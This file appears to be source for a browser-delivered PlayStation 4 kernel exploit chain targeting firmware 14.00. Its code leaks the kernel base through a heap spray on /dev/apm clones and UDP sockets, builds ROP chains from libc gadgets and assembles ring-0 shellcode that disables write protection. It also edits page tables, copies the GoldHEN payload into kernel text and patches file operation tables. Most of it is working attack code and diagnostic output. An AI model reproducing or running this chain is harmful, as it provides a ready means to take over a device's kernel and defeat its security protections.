      [0x12f35, "detect firmware, fill the pointer table"],
      [0x9ba88, "UI notice 'GoldHEN'", { ptr: true, rdi: 0x99eeb, esi: 0x1f4 }],
      [0x5cc6,  "save the original pointer from [0x9b8c0]"],
      [0x945,   "kernel patches A"],
      [0xf92,   "kernel patches B"],
      [0x2a4d,  "testkit fake, kernel patches, ShellCore/ShellUI patches"],
      [0x244e,  "syscalls 11/0xc5/0xc6 -- the door runs through GoldHEN from here"],
      [0x3306,  "0x2695 (54 kernel patches) + SceRemotePlay + exec handler"],
      [0x12f53, "notice 'GoldHEN v2.4b18.12 loaded!'", { rdi: 0x99ef3, esi: 0 }],
      [0x32c4,  "inject klog      -> 3232"],
      [0x325a,  "inject FTP       -> 2121"],
      [0x328f,  "inject BinLoader -> 9090"],
      [0x31af,  "inject mono ELF  -> SceShellUI"],
      [0x1dd,   "last hook on sysent[591]; turns write protection back on"],
      [0x9bad0, "klog line '[GoldHEN] All done!'", { ptr: true, rdi: 0x99f1e }],
    ];

    /* The payload's BSS lives in the kernel's RX text padding, and it writes
       into it 83 times without bracketing. During main's chain those writes get
       through because every step is wrapped in wp_off/wp_on; GoldHEN's later
       syscall hooks run with CR0.WP=1 and fall over -- the delayed death that
       cost this project a day. One RW bit in the page directory entry that covers
       the padding fixes it. It does not survive a reboot.

       The Lua version drives every read through GoldHEN's own trampoline because
       that is its only way into ring 0. We already hold the kernel gate, so this
       is plain reads and one write.

       Three cross-checks before anything is written. A guessed read of a kernel
       address cost two cold starts on the day this was first worked out. */
    const PT = {
      g1: 0x1b2c394, g2: 0x1b2c398, kphys: 0x1b2c420, pmpml4: 0x1b2c3c0,
      padFrom: 0xb3c000};

    function paddingRW(k, kbase) {
      const rd = function (a2) { return k.read_v(a2); };
      const kat = function (rva) { return plus(kbase, rva); };

      const g1 = rd(kat(PT.g1)), g2 = rd(kat(PT.g2));
      if (!g1 || !g2) { say("[rw] the dmap dwords are not readable"); return false; }
      /* DMAP = 0xffff800000000000 | (g1 << 39) | (g2 << 30) */
      const a1 = g1.low >>> 0, a2v = g2.low >>> 0;
      const dmap = v(((a2v & 3) * 0x40000000) >>> 0,
                     (0xffff8000 | ((a1 << 7) >>> 0) | (a2v >>> 2)) >>> 0);

      const kph = rd(kat(PT.kphys));
      if (!kph) { say("[rw] KPML4phys not readable"); return false; }
      /* the page directory root, as a kernel address through the direct map */
      const p4 = v((dmap.low + kph.low) >>> 0,
                   (dmap.hi + kph.hi + (((dmap.low >>> 0) + (kph.low >>> 0) > 0xffffffff) ? 1 : 0)) >>> 0);

      const pm = rd(kat(PT.pmpml4));
      if (!pm || !same(pm, p4)) {
        say("[rw] kernel_pmap->pm_pml4 is " + (pm ? text(pm) : "unreadable")
            + ", the calculation says " + text(p4) + " -- nothing written");
        return false;
      }
      say("[rw] dmap " + text(dmap) + ", pml4 " + text(p4) + " confirmed against kernel_pmap");

      /* one entry per level, by index out of the virtual address */
      const target = kat(PT.padFrom);
      const i4 = (target.hi >>> 7) & 511;
      const i3 = (((target.low >>> 30) & 3) | ((target.hi & 127) << 2)) & 511;
      const i2 = (target.low >>> 21) & 511;

      const viaDmap = function (ent) {               /* entry -> next table, mapped */
        const pl = (ent.low & 0xfffff000) >>> 0, ph = (ent.hi & 0x000fffff) >>> 0;
        return v((dmap.low + pl) >>> 0,
                 (dmap.hi + ph + (((dmap.low >>> 0) + pl > 0xffffffff) ? 1 : 0)) >>> 0);
      };

      const e4 = rd(plus(p4, i4 * 8));
      if (!e4 || (e4.low & 1) === 0) { say("[rw] pml4 entry " + i4 + " not present"); return false; }
      const e3at = plus(viaDmap(e4), i3 * 8);
      const e3 = rd(e3at);
      if (!e3 || (e3.low & 1) === 0) { say("[rw] pdp entry " + i3 + " not present"); return false; }
      if ((e3.low & 0x80) !== 0) { say("[rw] the pdp entry is a 1 GiB page -- not handled"); return false; }
      const e2at = plus(viaDmap(e3), i2 * 8);
      const e2 = rd(e2at);
      if (!e2 || (e2.low & 1) === 0) { say("[rw] pd entry " + i2 + " not present"); return false; }

      const big = (e2.low & 0x80) !== 0;
      if (!big) { say("[rw] the pd entry is not a large page -- the padding is split, not handled"); return false; }
      if ((e2.low & 2) !== 0) { say("[rw] the padding already carries RW"); return true; }

      if (!k.write_v(e2at, v((e2.low | 2) >>> 0, e2.hi))) {
        say("[rw] the page directory entry is not writable"); return false;
      }
      const back = rd(e2at);
      if (!back || (back.low & 2) === 0) { say("[rw] the RW bit did not stick"); return false; }
      say("[rw] RW set on the pd entry at " + text(e2at) + " -- the padding is writable");
      return true;
    }

    async function loadGoldhen(url, k, kbase, room, vorab) {
      const c = host();
      let blob = vorab || null;
      if (blob === null) {
        blob = await fetchBytes(url, "g");
        if (blob === null) return false;
      }

      if (blob.length !== GH.nlOff + GH.nlLen) {
        say("[g] " + blob.length + " bytes, expected " + (GH.nlOff + GH.nlLen)
            + " -- this is not the image this recipe describes");
        return false;
      }

      const size = (blob.length + 0x4fff) & -4096;
      const m = sc(S.mmap, 0, size + 0x1000, 3, 0x1002, -1, 0);
      const buf = v(m.lo, m.hi);
      if (m.i32 === -1 || (buf.hi >>> 0) === 0) { say("[g] mmap failed, errno " + c.errno()); return false; }
      /* touch every page: the kernel writes in here, and a lazily mapped page
         would fault in ring 0 */
      for (let o = 0; o <= size; o += 0x1000) wr4(plus(buf, o), 0);
      if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) {
        say("[g] mprotect rwx failed, errno " + c.errno()); return false;
      }
      /* Only the trampoline page is ever entered from this mapping. Executability
         here is per page, and that is measured, not assumed: page 0x47000 carries
         ring 0 code, page 0 does not -- a three byte probe there took the console
         (02.11. 14:27). So the gate stub and the trampoline live at 0x47c00/0x47c40
         and nothing else from this image is ever jumped to. */
      codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");

      /* Before ring 0 is sent in there, ask from ring 3. Touching a page with a
         write gives it RW and no X; an instruction fetch needs another fault to
         add it, and that fault taken in ring 0 on a userland page is the
         documented death. A plain `ret` entered with callAddr runs in ring 3
         instead: if the page carries no X the WebProcess dies and the console
         does not. Same question, a page instead of a console. */
      codeAt(buf, GH.tram + 0x200).hex("c3");
      const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
      if (r3 === undefined || r3 === null) {
        say("[g] the trampoline page does not execute even in ring 3 -- stopping");
        return false;
      }
      say("[g] trampoline page executes in ring 3, so ring 0 may follow");

      for (let o = 0; o < blob.length; o += 8) {
        let lo = 0, hi = 0;
        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
        c.p.write8(plus(buf, o), v(lo >>> 0, hi >>> 0));
      }
      say("[g] " + blob.length + " bytes at " + text(buf));

      /* the userland side of the gate, exactly as the ring 0 work uses it */
      const gate = codeAt(buf, GH.tor);
      gate.hex("4831c0").hex("4989ca").hex("0f05").hex("c3");


      let t = null;
      const tram = { n: 0 };
      const b1 = function (x) { wr1(plus(buf, GH.tram + tram.n), x); tram.n++; };
      const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
      const i32 = function (n) { for (let k = 0; k < 4; k++) b1(Math.floor(n / Math.pow(256, k)) % 256); };
      const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
      const callAbs = function (rva) { hex("48b8"); q64(plus(t, rva)); hex("ffd0"); };
      const wpOff = function () { hex("0f20c0"); hex("4825"); i32(0xfffeffff); hex("0f22c0"); };
      const wpOn  = function () { hex("0f20c0"); hex("480d"); i32(0x00010000); hex("0f22c0"); };
      const fire  = function () {
        const r = c.callAddr(plus(buf, GH.tor), [11, plus(buf, GH.tram)]);
        return r.lo >>> 0;
      };
      const markClear = function (s2) {
        wr4(plus(buf, GH.mark + s2 * 8), 0xDEADBEEF);
        wr4(plus(buf, GH.mark + s2 * 8 + 4), 0xDEADBEEF);
      };
      const markRead = function (s2) {
        return [rd4(plus(buf, GH.mark + s2 * 8)), rd4(plus(buf, GH.mark + s2 * 8 + 4))];
      };

      /* The Lua chain ran a 641 byte kernel patch set before any of this, and
         the kernel stage's fifteen are not the same set: the blob writes to 51 places,
         of which the kernel stage covers 25. The thirty it does not -- a block around
         0x125791 and three singles -- are what GoldHEN's own code expects to
         find. The blob is position independent, takes no arguments, fetches the
         kernel base itself through rdmsr and ends in ret, so it only has to be
         put somewhere ring 0 may run from. This mapping is, as just measured. */
      /* It does not go into this mapping. The Lua chain puts it in the libc text
         tail at rva 0x130730 -- the same room the kernel stage runs its ring 0
         bodies from, and the only region here that is proven executable in ring 0
         by every call made so far. The three byte test above proved the page at
         +0x47000 and said nothing about any other, which is exactly the trap the
         Lua notes warn about: one page in eighteen. 641 bytes fit in the body
         area, +0xc0 to +0x400. the kernel stage rebuilds that body on its next use. */
      if (!(await runPatchSet(room))) return false;

      /* The Lua chain calls 0x144d and 0xce9 here. Their job is to work out the
         kernel base and leave it at +0x47b20, which step 4 then reads back -- we
         have had that base since [1] and it was checked against the gate at [7],
         so the two calls buy nothing.

         Skipping them is also what keeps this safe. They sit at image offset
         0x144d, on the mapping's second page; the trampoline sits at 0x47c40, on
         a page every call so far has already run from. Executability here is per
         page -- the Lua notes measured one page in eighteen on an allocator
         buffer -- and the three byte test proves only the page it ran on. With
         these two gone, the only code entered from this mapping is the
         trampoline, and everything else runs from the kernel's own padding. */
      /* The pre-stage calls 0x144d and 0xce9 only to work out the kernel base and
         leave it at +0x47b20. We have had that base since [1] and checked it
         against the gate at [7], and those two sit on a page ring 0 may not run
         from -- so they stay skipped and the value is written as they would have
         left it. */
      const kb = kbase;
      t = plus(kb, GH.rvaPad);
      wr8(plus(buf, GH.kptr), plus(kb, GH.rvaKmem));
      say("[g] kernel base " + text(kb) + " (from the exploit), padding " + text(t));

      /* before a single byte of GoldHEN goes into the padding */
      if (!paddingRW(k, kb)) { say("[g] stopping: the padding would stay read only"); return false; }

      /* the payload goes into the kernel's padding, not into a thread */
      tram.n = 0;
      wpOff();
      hex("48be"); q64(plus(buf, GH.nlOff));
      hex("48bf"); q64(t);
      hex("b9"); i32(GH.nlLen);
      hex("fc"); hex("f3a4");
      wpOn();
      hex("b8"); i32(0x5758); hex("c3");
      const cp = fire();
      if (cp !== 0x5758) { say("[g] copy into the padding returned 0x" + cp.toString(16)); return false; }
      say("[g] [3] " + GH.nlLen + " bytes into the padding");

      let good = 0, silent = 0;
      for (let n = 0; n < GH_STEPS.length; n++) {
        const rva = GH_STEPS[n][0], what = GH_STEPS[n][1], o = GH_STEPS[n][2] || {};
        markClear(0);
        tram.n = 0;
        wpOff();
        if (o.rdi !== undefined) { hex("48bf"); q64(plus(t, o.rdi)); }
        if (o.esi !== undefined) { hex("be"); i32(o.esi); }
        hex("31c0");
        if (o.ptr) { hex("48b8"); q64(plus(t, rva)); hex("488b00"); hex("ffd0"); }
        else callAbs(rva);
        hex("4898");
        hex("48b9"); q64(plus(buf, GH.mark));
        hex("488901");
        wpOn(); hex("31c0"); hex("c3");
        fire();
        const mk = markRead(0);
        if (mk[1] === 0xDEADBEEF) {
          say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
          silent++;
        } else {
          let rc = mk[0];
          if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
          good++;
          if (rc !== 0) say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc
                            + (rc === 3 ? " (target already injected)" : ""));
        }
      }
      say("[g] " + good + " of " + GH_STEPS.length + " calls returned, " + silent + " silent");
      return silent === 0;
    }

    /* ------------------------------------------------- defusing the handles */

    /* Every attempt leaves device handles and a queue behind. Closing them during
       the run kills the console; leaving them kills it when the process dies,
       because neither teardown finishes -- the device close ends in
       destroy_dev_sched, and closing a queue walks its notes and detaches each
       one from a device that is gone.

       So neither path is taken. Both operation tables are copied into the zero
       filled tail of kernel text, the close entry of each copy is pointed at an
       `xor eax,eax ; ret`, and the handles are rehung onto the copies. The cdevs
       leak until reboot, which is harmless.

       In a browser this is not optional and not something to do later: the page
       can go away at any moment, and that moment is the one that hangs. */
    const PADDING = 0x0b39d98;
    const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
    const RET0 = 0x00c3c031;             /* xor eax,eax ; ret */

    /* The rehang used to be two ring 0 reads and sometimes a write per handle,
       each its own gate entry -- some 660 of them for 220 handles, in a row. The
       same arithmetic as the spray: put the loop in ring 0 and it is one entry.
       The two bodies below were checked against a disassembler before they were
       ever sent, because a wrong jump displacement here is a dead console. */
    function rehangRing0(k, room, ofs, list, from, copy) {
      if (!list.length || list.length > 256 || !from) return null;
      for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
      const c = k.begin();
      c.hex("31c0");                                   /* moved = 0 */
      c.hex("48be").qw(plus(room, STAGE));             /* rsi = the fd list */
      c.hex("48b9").qw(splitNum(list.length));         /* rcx = how many */
      c.hex("49b8").qw(ofs);                           /* r8  = open file array */
      c.hex("49b9").qw(from);                          /* r9  = the table to replace */
      c.hex("49ba").qw(copy);                          /* r10 = our copy */
      c.hex("4885c9").hex("7421").hex("486316").hex("4883c604").hex("48ffc9");
      c.hex("4d8b1cd0").hex("4d85db").hex("74e8").hex("4d394b08").hex("75e2");
      c.hex("4d895308").hex("ffc0").hex("ebda");
      c.hex("48ba").qw(plus(room, OUT)).hex("488902");
      if (!k.run()) return null;
      return rd4(plus(room, OUT));
    }

    function countOffRing0(k, room, ofs, list, copy) {
      if (!list.length || list.length > 256) return null;
      for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
      const c = k.begin();
      c.hex("31c0");
      c.hex("48be").qw(plus(room, STAGE));
      c.hex("48b9").qw(splitNum(list.length));
      c.hex("49b8").qw(ofs);
      c.hex("49ba").qw(copy);
      c.hex("4885c9").hex("741d").hex("486316").hex("4883c604").hex("48ffc9");
      c.hex("4d8b1cd0").hex("4d85db").hex("7406").hex("4d395308").hex("74e2");
      c.hex("ffc0").hex("ebde");
      c.hex("48ba").qw(plus(room, OUT)).hex("488902");
      if (!k.run()) return null;
      return rd4(plus(room, OUT));
    }

    function teardown(k, kbase, ofs, devs, queues, room) {
      const kat = function (rva) { return plus(kbase, rva); };
      const fileOf = function (fd) { return k.read_v(plus(ofs, fd * 8)); };

      const stub = kat(PADDING + OFF_STUB);
      const dtab = kat(PADDING + OFF_DEVS);
      const qtab = kat(PADDING + OFF_QUEUES);

      say("[t] reading the padding at " + text(stub));
      const there = k.read_v(stub);
      if (!there) { say("[t] kernel text not readable at " + text(stub)); return false; }
      say("[t] it holds " + text(there));
      if ((there.low >>> 0) === (RET0 >>> 0)) {
        say("[t] the stub is already there from an earlier run");
      } else if (isZero(there)) {
        if (!k.write_v(stub, v(RET0, 0))) { say("[t] kernel text not writable"); return false; }
        const back = k.read_v(stub);
        if (!back || (back.low >>> 0) !== (RET0 >>> 0)) { say("[t] the stub did not stick"); return false; }
      } else {
        say("[t] something else is at " + text(stub) + ": " + text(there)); return false;
      }

      const clone = function (from, to, what) {
        for (let i = 0; i <= 10; i++) {
          let q = k.read_v(plus(from, i * 8));
          if (!q) { say("[t] " + what + " unreadable at +0x" + (i * 8).toString(16)); return false; }
          if (i === 7) q = stub;                       /* fo_close */
          if (!k.write_v(plus(to, i * 8), q)) { say("[t] " + what + " not writable"); return false; }
        }
        const c = k.read_v(plus(to, 0x38));
        return c !== null && same(c, stub);
      };

      /* Taking the table from the first handle is wrong on a second run: that one
         already points at our copy, and every handle still on the original would
         then look foreign and be skipped. */
      const original = function (list, copy) {
        for (let i = 0; i < list.length; i++) {
          const f = fileOf(list[i]);
          if (f && inHeap(f)) {
            const cur = k.read_v(plus(f, 0x08));
            if (cur && inText(cur) && !same(cur, copy)) return cur;
          }
        }
        return null;
      };
      const ready = function (copy) {
        const c = k.read_v(plus(copy, 0x38));
        return c !== null && same(c, stub);
      };
      const rehang = function (list, from, copy) {
        let moved = 0;
        for (let i = 0; i < list.length; i++) {
          const f = fileOf(list[i]);
          const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
          if (cur && same(cur, copy)) moved++;
          else if (cur && from && same(cur, from) && k.write_v(plus(f, 0x08), copy)) moved++;
        }
        return moved;
      };

      say("[t] looking for the device table across " + devs.length + " handles");
      const devOps = original(devs, dtab);
      if (devOps) {
        if (!ready(dtab) && !clone(devOps, dtab, "device table")) return false;
      } else if (!ready(dtab)) {
        say("[t] no device table to copy -- nothing done"); return false;
      }
      let moved = rehangRing0(k, room, ofs, devs, devOps, dtab);
      if (moved === null) { say("[t] rehanging one at a time"); moved = rehang(devs, devOps, dtab); }
      say("[t] " + moved + " of " + devs.length + " handles on the copy");

      let movedq = 0;
      if (queues && queues.length) {
        const qOps = original(queues, qtab);
        if (qOps && !same(qOps, devOps || qtab)) {
          if (ready(qtab) || clone(qOps, qtab, "queue table")) movedq = rehang(queues, qOps, qtab);
        } else if (ready(qtab)) movedq = queues.length;
      }
      say("[t] " + movedq + " of " + (queues ? queues.length : 0) + " queues on the copy");

      /* A neutralised close entry is not the whole story: exit1() also runs
         knote_fdclose() for every descriptor, and that does not go through
         fo_close. Our notes hang on clones freed long ago, so walking them at
         exit reads dead memory. kqueue_close takes the note array length from
         the high half of the quadword at kq+0xa0; with it at zero nothing is
         walked at all. */
      let notes = 0;
      for (let i = 0; queues && i < queues.length; i++) {
        const f = fileOf(queues[i]);
        if (!f || !inHeap(f)) continue;
        const kq = k.read_v(f);                        /* f_data sits at the front */
        if (!kq || !inHeap(kq)) continue;
        const w = k.read_v(plus(kq, 0xa0));
        if (!w) continue;
        if ((w.hi >>> 0) !== 0) { if (k.write_v(plus(kq, 0xa0), v(w.low, 0))) notes++; }
        else notes++;
      }
      say("[t] note lists emptied on " + notes + " of " + (queues ? queues.length : 0) + " queues");

      let left = countOffRing0(k, room, ofs, devs, dtab);
      if (left === null) {
        left = 0;
        for (let i = 0; i < devs.length; i++) {
          const f = fileOf(devs[i]);
          const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
          if (!(cur && same(cur, dtab))) left++;
        }
      }
      if (left === 0 && moved > 0) { say("[t] all " + devs.length + " handles are on the copy"); return true; }
      say("[t] " + left + " handles are still on the original -- the page must not go away");
      return false;
    }

    /* ------------------------------------------------------------ the probe */

    /* Fires nothing. It opens device nodes without closing them, which is what
       the exploit does anyway, and it opens and closes sockets. No unit is spent:
       a unit is only spent when its clone is freed, and nothing is freed here. */
    function probeAfterglow(ctx) {
      STATE.ctx = ctx;
      const out = { ok: false, reasons: [] };
      const no = function (why) { out.reasons.push(why); };

      const noStub = seedStubs();
      out.stubs = noStub.length ? ("missing " + noStub.join(",")) : "all resolved";
      if (noStub.length) no("no libkernel stub for syscall " + noStub.join(","));

      let lib = findLib("libSceLibcInternal.sprx");
      if (!lib.base) {
        const m = findLibByShape();
        if (m.base) { lib = { base: m.base, at: "gadget shape", count: lib.count, seen: lib.seen }; }
        else say("AG libc: " + m.note + " | entries=" + m.entries
                 + " first=[" + m.first.join(" ") + "]");
      }
      const libc = lib.base;
      out.libc = libc ? (text(libc) + " via " + lib.at) : "not found";
      out.modules = lib.count;
      if (!libc) {
        no(lib.note || "libSceLibcInternal is not mapped");
        say("probe: stubs=" + out.stubs + " modules=" + lib.count + " rv=" + lib.rv
            + " seen=[" + lib.seen.join(" ") + "] -- " + out.reasons.join("; "));
        return out;
      }

      let missing = null;
      for (const name in GADGETS) {
        const want = unhex(GADGETS[name][1]);
        if (!sameBytes(rdbuf(plus(libc, GADGETS[name][0]), want.length), want)) { missing = name; break; }
      }
      out.gadgets = missing ? ("missing " + missing) : "all present";
      if (missing) no("gadget " + missing + " is missing -- different libc build");

      let dirty = 0;
      for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
        if (rd4(plus(libc, HOST.free + off)) !== 0) dirty++;
      }
      out.tail = (HOST.last - HOST.free) + " bytes, " + dirty + " dwords non zero";
      if (dirty) no("the spare room behind libc is occupied");

      let node = null;
      for (let i = 0; i < PROBE_NODES.length; i++) {
        const fd = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
        if (fd >= 0) { node = PROBE_NODES[i]; break; }
      }
      out.probeNode = node;
      if (!node) no("no usable device node for the probe descriptor");

      /* /dev/apm is a cloning node: each open makes a new numbered unit, and that
         unit exists only while the descriptor is held. So they are not a resource
         the sandbox hands out -- we make them. Held open on purpose here; closing
         one is what frees its clone, and that is the free the exploit needs, not
         something to do while counting. */
      const held = [];
      for (let i = 0; i < 20; i++) {
        const fd = sc(S.open, cstr("/dev/apm").at, 0).i32;
        if (fd < 0) break;
        held.push(fd);
      }
      out.apm = held.length ? (held.length + " clones held") : ("refused, errno " + host().errno());
      if (!held.length) no("/dev/apm cannot be opened in this sandbox");

      const open = [], refused = [];
      for (let u = 0; u < 32; u++) {
        const fd = sc(S.open, cstr("/dev/apm" + u).at, 0).i32;
        if (fd >= 0) { open.push(u); sc(S.close, fd); }
        else if (refused.length < 3) refused.push(u + ":e" + host().errno());
      }
      out.units = open.length;
      out.unitList = open.length ? open.join(",") : "none";
      out.unitRefused = refused.join(" ") || "-";
      if (open.length < 3) no("only " + open.length + " apm units with " + held.length + " clones held");

      const pin = pinCore();
      out.pin = pin.ok ? ("core " + pin.core + " of [" + pin.allowed + "]") : ("FAILED: " + pin.note);
      if (!pin.ok) no("cannot pin to a cpu: " + pin.note);

      const socks = [];
      for (let i = 0; i < TUNE.sprays; i++) {
        const fd = sc(S.socket, 2, 2, 0).i32;
        if (fd < 0) break;
        socks.push(fd);
      }
      out.udp = socks.length;

      /* How wide the window would be. Setting the option allocates in the zone
         the exploit uses, but nothing was freed here, so there is no hole to
         win -- the sockets are closed again right after. */
      if (socks.length) {
        const body = alloc(TUNE.object); body.u8.fill(0);
        const req = alloc(40);
        req.dv.setUint32(0, 1, true);
        pokeAt(req, 8, alloc(16).at);
        req.dv.setUint32(16, 16, true);
        pokeAt(req, 24, body.at);
        req.dv.setUint32(32, TUNE.object, true);
        /* Measure it the way the real run does it: batched and prebuilt.
           Unbatched, the probe reported 16 ms where the run sits under one -- a
           number pointing the wrong way is worse than no number. */
        const stub = stubFor(S.setsockopt);
        const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
        let t0, t1;
        if (nb) {
          const calls = [];
          for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
          const fertig = [];
          for (let i = 0; i < calls.length; i += nb) {
            try { fertig.push(host().prepareMany(calls.slice(i, i + nb))); }
            catch (e) { fertig.length = 0; break; }
          }
          if (fertig.length) {
            host().runPrepared(fertig[0]);                       /* aufwaermen */
            t0 = performance.now();
            for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
            t1 = performance.now();
            out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
          }
        }
        if (out.window === undefined) {
          t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
          for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
          t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
          out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
        }
      } else out.window = "not measured";

      for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
      if (socks.length < TUNE.sprays) {
        no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
      }

      out.ok = out.reasons.length === 0;
      /* one item per line: the console log pane cuts at the right edge, and the
         number this whole exercise is about was the one falling off it */
      say("probe libc   " + out.libc);
      say("probe gadget " + out.gadgets + ", tail " + out.tail);
      say("probe apm    " + out.apm + ", node " + out.probeNode);
      say("probe units  " + out.units + " open: " + out.unitList);
      say("probe refused " + out.unitRefused);
      say("probe pin    " + out.pin);
      say("probe window " + out.window);
      say("probe UDP    " + out.udp + " of " + TUNE.sprays + " needed");
      say("probe SHOTS  " + out.units + " units, a run needs 3");
      if (out.ok) say("probe VERDICT usable");
      else for (let i = 0; i < out.reasons.length; i++) say("probe BLOCKED " + out.reasons[i]);
      return out;
    }

    /* --------------------------------------------------------------- the run */

    async function attempt(ctx, opts) {
      STATE.ctx = ctx;
      STATE.retry = false;
      say("14.00 kernel stage -- PlayStation 4 (Karo Host)");

      const missing = seedStubs();
      if (missing.length) {
        say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
        return false;
      }

      /* the free and the refill have to happen on one core, or they land in
         different per cpu buckets and the hole is never refilled */
      const pin = pinCore();
      if (!pin.ok) {
        say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
        say("  Unpinned, the free and the refill land in different per cpu buckets,");
        say("  the hole is filled by somebody else, and ring 0 continues on that");
        say("  stranger's stack pointer. That is a dead console, not a bad run.");
        return false;
      }
      say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");

      /* Is the kernel already open? A reload on a console that has been done once
         would otherwise burn triggers against a kernel that is already patched --
         and the enabler restarting SceShellUI is exactly what makes the browser
         reload. rwx mmap is the cheapest question that only answers yes after a
         successful run. */
      {
        const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
        if (m0.i32 !== -1 && sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7).i32 === 0) {
          say("  this kernel is already open -- a run has succeeded on this boot.");
          say("  Not firing again; reboot the console for a fresh one.");
          return false;
        }
      }

      let lib = findLib("libSceLibcInternal.sprx");
      if (!lib.base) lib = findLibByShape();
      const libc = lib.base;
      if (!libc) { say("  " + (lib.note || "libc is not mapped")); return false; }

      const gad = {};
      for (const name in GADGETS) {
        const want = unhex(GADGETS[name][1]);
        const at = plus(libc, GADGETS[name][0]);
        if (!sameBytes(rdbuf(at, want.length), want)) {
          say("  gadget " + name + " is missing -- this is not the libc build we know");
          return false;
        }
        gad[name] = at;
      }

      const shot = shooter(gad);
      const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);

      /* ---- the kernel base ------------------------------------------------- */

      let kbase = STATE.base;
      if (kbase) {
        say("[1] base " + text(kbase) + ", carried over from this boot");
      } else {
        const win = alloc(TUNE.window + 16);
        wipe(win, TUNE.window + 16);

        const r = shot.take(function (c) {
          /* round down to the start of the slab, so the window also covers the
             neighbours that sit below the freed object */
          c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
          c.grab(win.at, TUNE.window);
        });

        const at = function (off) { return qAt(win, off); };

        /* four kernel pointers spaced 0x20/0x40/0x50 apart identify the object */
        let found = null;
        for (let off = 0; off <= TUNE.window - 0x20; off += 8) {
          const a = at(off);
          if (a.hi === 0xffffffff) {
            const b = at(off + 8), c2 = at(off + 0x10), d = at(off + 0x18);
            if (b.hi === 0xffffffff && c2.hi === 0xffffffff && d.hi === 0xffffffff
                && ((b.low - a.low) >>> 0) === 0x20
                && ((c2.low - a.low) >>> 0) === 0x40
                && ((d.low - a.low) >>> 0) === 0x50) { found = a; break; }
          }
        }

        /* One pointer is enough on its own: the base sits on a 16 KiB grid, so
           the anchor can only ever show up at a single offset within a page. This
           runs even when the signature matched, because two methods that agree
           are worth more than one that cannot be checked -- and a wrong base
           sends the next chain straight through a nonsense descriptor table,
           which is the likeliest way this step takes the console with it. */
        let voted = null;
        {
          const mark = K.anchor % 0x4000, tally = {};
          for (let off = 0; off <= TUNE.window - 8; off += 8) {
            const a = at(off);
            if (a.hi === 0xffffffff && a.low !== 0xffffffff && a.low % 0x4000 === mark) {
              const b = (a.low - K.anchor) >>> 0;
              if (b % 0x4000 === 0) tally[b] = (tally[b] || 0) + 1;
            }
          }
          let best = null, top = 0, second = 0;
          for (const b in tally) {
            const n = tally[b];
            if (n > top) { second = top; best = Number(b); top = n; }
            else if (n > second) second = n;
          }
          if (best !== null && top > second) voted = v(best + K.anchor, 0xffffffff);
        }

        if (found && voted && !same(found, voted)) {
          say("[1] the two readings disagree: " + text(found) + " against " + text(voted)
              + " -- stopping here");
          return false;
        }
        found = found || voted;
        if (found && ((found.low - K.anchor) >>> 0) % 0x4000 !== 0) {
          say("[1] " + text(found) + " is not on the 16 KiB grid -- not a base, stopping here");
          return false;
        }

        say("[1] leak: queue=" + r + " sprays=" + shot.sprayed + " anchor="
            + (found ? text(found) : "missed")
            + ((found && voted && same(found, voted)) ? " (both readings agree)" : ""));
        if (!found) {
          if (r === null && shot.sprayed === 0) {
            say("    no free apm unit left -- this boot is spent, reboot the console.");
          } else {
            say("    the spray did not take");
            STATE.retry = true;
          }
          return false;
        }
        kbase = plus(found, -945248);
        STATE.base = kbase;
        say("    base " + text(kbase));
      }

      const kat = function (rva) { return plus(kbase, rva); };

      /* ---- handles and mappings, in one chain ------------------------------ */

      let probe = -1, node = null;
      for (let i = 0; i < PROBE_NODES.length && probe < 0; i++) {
        probe = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
        if (probe >= 0) node = PROBE_NODES[i];
      }
      if (probe < 0) { say("[2] no device node opened for the probe descriptor"); return false; }

      for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
        if (rd4(plus(hostFree, off)) !== 0) {
          say("[2] the spare room behind libc is occupied -- nothing written");
          return false;
        }
      }
      say("[2] probe fd " + probe + " on " + node + ", " + (HOST.last - HOST.free)
          + " bytes of spare room behind libc");

      /* How far the kernel side has to be walked. The listing already told us
         where the host page sits; one entry of slack, and never more than the
         table we allocated for. */
      let reach = TUNE.entries;
      if (MAPS) {
        for (let i = 0; i < MAPS.length; i++) {
          const a0 = MAPS[i][0], b0 = MAPS[i][1];
          const above = a0.hi < hostPage.hi || (a0.hi === hostPage.hi && a0.low <= hostPage.low);
